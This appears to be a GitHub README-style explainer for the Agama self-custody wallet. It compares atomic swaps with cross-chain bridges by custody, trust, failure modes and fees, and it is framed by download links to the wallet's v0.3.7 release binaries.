[![Agama Wallet](assets/banner-article.png)](https://github.com/agama-wallet/agama-desktop-wallet)

# Atomic Swaps vs Bridges: Two Ways to Move Value Across Chains

<div align="center">

<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/tag/v-0.3.7"><img src="https://img.shields.io/badge/RELEASE-v0.3.7-F47B20?style=for-the-badge&amp;labelColor=293D52" alt="Agama Wallet v0.3.7"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/blob/main/LICENSE"><img src="https://img.shields.io/badge/LICENSE-MIT-F47B20?style=for-the-badge&amp;labelColor=293D52" alt="MIT licence"></a>

</div>

<div align="center">

| Platform | File |
|---|---|
| <img src="https://img.shields.io/badge/WINDOWS-293D52?style=flat-square&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZicgZD0nTTAgMy40IDkuNyAydjkuNUgwek0xMSAxLjggMjQgMHYxMS42SDExek0wIDEyLjZoOS43VjIxTDAgMjAuNnpNMTEgMTIuNkgyNFYyNGwtMTMtMS44eicvPjwvc3ZnPg%3D%3D&amp;logoColor=white" alt="Windows" height="24"> | [`agamawallet-v.0.3.7.exe`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.exe) |
| <img src="https://img.shields.io/badge/MACOS-293D52?style=flat-square&amp;logo=apple&amp;logoColor=white" alt="Macos" height="24"> | [`agamawallet-v.0.3.7.dmg`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.dmg) |
| <img src="https://img.shields.io/badge/LINUX-293D52?style=flat-square&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | [`agamawallet-v.0.3.7.zip`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.zip) |

</div>
All versions and checksums are on the [Agama Wallet release page](https://github.com/agama-wallet/agama-desktop-wallet/releases/tag/v-0.3.7).

> Only download from this GitHub release page.

---

An atomic swap exchanges ownership between two parties with no custodian and no wrapped asset; a bridge moves or represents an asset across chains through a contract or a validator set that must be trusted. Swaps fail by timeout and refund; bridges fail by contract, validator or backing. Agama Wallet is a self-custody multi-asset wallet for the Komodo ecosystem with built-in atomic swaps, so its cross-chain route is the first kind.

## You'll see this if

You need an asset on another chain and the routes on offer differ in ways the interfaces do not explain: one asks you to deposit, another asks you to connect a wallet and approve a contract.

| Property | Atomic swap | Bridge |
|---|---|---|
| Custody during the trade | None | Contract or validator set |
| Asset you receive | The native asset on its own chain | Often a representation of an asset |
| Trust assumption | The counterparty acts before a deadline | The bridge's code and operators behave |
| Failure mode | Stalled leg, resolved by timeout | Exploit, validator failure, depeg |
| Speed | Two chains, several confirmations each | Usually one chain plus a mint |
| Fee structure | Network fees on both chains | Network fee plus bridge fee |

Neither row is automatically better. They answer different needs.

## Why it happens

A swap cannot create an asset on a chain where it does not exist. It can only exchange what both parties already hold, so it works when the asset is native on both sides and someone wants the other one.

A bridge exists to solve the case a swap cannot: making an asset usable on a chain that does not issue it. That requires a claim on the destination chain backed by something on the source chain, and the backing is where the trust lives. If the backing is a contract holding locked funds, the contract's correctness is the guarantee. If it is a validator set, their honesty is.

That is the whole distinction: a swap's guarantee is cryptographic and ends when the trade ends; a bridge's guarantee is institutional or contractual and lasts as long as the representation exists.

## Fix

Choosing between them is a short set of questions, and the answers are usually decisive.

1. **Ask whether the asset is native on both chains.** If yes, a swap is possible; if no, a bridge or a wrapped asset is the only route.
2. **Ask who holds value after the trade.** After a swap, nobody; after a bridge, the backing still exists and someone controls it.
3. **Ask what happens if the operator disappears.** A completed swap is unaffected; a bridge representation may not be redeemable.
4. **Ask what the failure looks like.** A swap stalls and refunds; a bridge can lose the backing entirely.
5. **Ask what you need it for.** If you need to hold the native asset, a swap preserves that; a representation may not serve the purpose.

The mechanism behind the first column is in [how atomic swaps work](https://github.com/agama-wallet/atomic-swaps/blob/main/step-by-step-mechanics.md).

## If that did not work

If a swap has no counterparty, there is nothing to fix: the pair lacks liquidity at that moment. A bridge would complete because it does not need a counterparty, which is exactly the trade-off.

If a bridged asset trades at a discount to the native one, the market is pricing the backing risk. That gap is information, not a malfunction.

If a bridge transaction is stuck, the remedy depends on the bridge's design and usually requires its operators. A swap's remedy is in your own hands: wait for the deadline, then refund.

If an interface calls a custodial transfer a "bridge" or a "swap", the label is wrong and the custody question decides the risk. Ask who holds the funds, and the product categories resolve themselves.

## Prevention

- **Decide whether you need the native asset or a representation.** Most disappointments come from this question being skipped, and they surface months later when redemption is attempted.
- **Prefer the route with the shorter trust chain for the amount at stake.** Swaps end; bridges persist.
- **Check liquidity first on the swap route.** A thin pair can wait a long time.
- **Read what backs a bridged asset.** If the answer is unclear, treat the representation as unsecured.
- **Keep fees on both chains for a swap.** [Atomic swap fees](https://github.com/agama-wallet/atomic-swaps/blob/main/what-a-trade-costs.md) sets out what each side pays, including why a two-chain trade costs more than a single-chain transfer of the same value.

## FAQ

### Can a bridge be atomic?

A bridge transaction can be atomic on one chain, but the cross-chain claim is not: it depends on the bridge's mechanism, not on a shared secret. That is the difference from a swap.

### Are atomic swaps always cheaper than bridges?

No. A swap needs transactions on two chains, which can cost more than a single-chain bridge fee, especially when one chain is congested.

### Do bridges require KYC?

Some do, some do not; it depends on the operator. A swap has no operator, so no identity check is part of the mechanism.

### What does a bridge failure actually look like?

Three shapes: the contract is exploited and the backing is drained, the validator set stops honouring withdrawals, or the representation loses its redemption path. In the first two the asset still exists but cannot be redeemed; in the third it trades at a discount. A swap has none of these failure modes because there is no backing to drain.

### Which is safer?

For a trade between two native assets, a swap removes the custodian and therefore the largest single risk. For an asset that only exists on one chain, there is no swap option and the bridge's backing is the risk you accept.

---

## Download Agama Wallet v0.3.7

<div align="center">

<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZicgZD0nTTAgMy40IDkuNyAydjkuNUgwek0xMSAxLjggMjQgMHYxMS42SDExek0wIDEyLjZoOS43VjIxTDAgMjAuNnpNMTEgMTIuNkgyNFYyNGwtMTMtMS44eicvPjwvc3ZnPg%3D%3D&amp;logoColor=white" alt="Download Agama Wallet for Windows"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=apple&amp;logoColor=white" alt="Download Agama Wallet for Macos"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=linux&amp;logoColor=white" alt="Download Agama Wallet for Linux"></a>

</div>

<div align="center">

| Platform | File |
|---|---|
| <img src="https://img.shields.io/badge/WINDOWS-293D52?style=flat-square&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZicgZD0nTTAgMy40IDkuNyAydjkuNUgwek0xMSAxLjggMjQgMHYxMS42SDExek0wIDEyLjZoOS43VjIxTDAgMjAuNnpNMTEgMTIuNkgyNFYyNGwtMTMtMS44eicvPjwvc3ZnPg%3D%3D&amp;logoColor=white" alt="Windows" height="24"> | [`agamawallet-v.0.3.7.exe`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.exe) |
| <img src="https://img.shields.io/badge/MACOS-293D52?style=flat-square&amp;logo=apple&amp;logoColor=white" alt="Macos" height="24"> | [`agamawallet-v.0.3.7.dmg`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.dmg) |
| <img src="https://img.shields.io/badge/LINUX-293D52?style=flat-square&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | [`agamawallet-v.0.3.7.zip`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.zip) |

</div>
All versions and checksums are on the [Agama Wallet release page](https://github.com/agama-wallet/agama-desktop-wallet/releases/tag/v-0.3.7).

> Only download from this GitHub release page, and compare each file with the value printed there.

## Related guides

- [What Is an Atomic Swap? Exchange Without an Intermediary](https://github.com/agama-wallet/atomic-swaps/blob/main/exchange-without-an-intermediary.md)
- [Cross-Chain Swaps: What They Are and Where They Fail](https://github.com/agama-wallet/atomic-swaps/blob/main/moving-value-between-chains.md)
- [How Atomic Swaps Work, Step by Step](https://github.com/agama-wallet/atomic-swaps/blob/main/step-by-step-mechanics.md)
- [Are Atomic Swaps Safe? The Risks That Remain](https://github.com/agama-wallet/atomic-swaps/blob/main/are-they-safe.md)
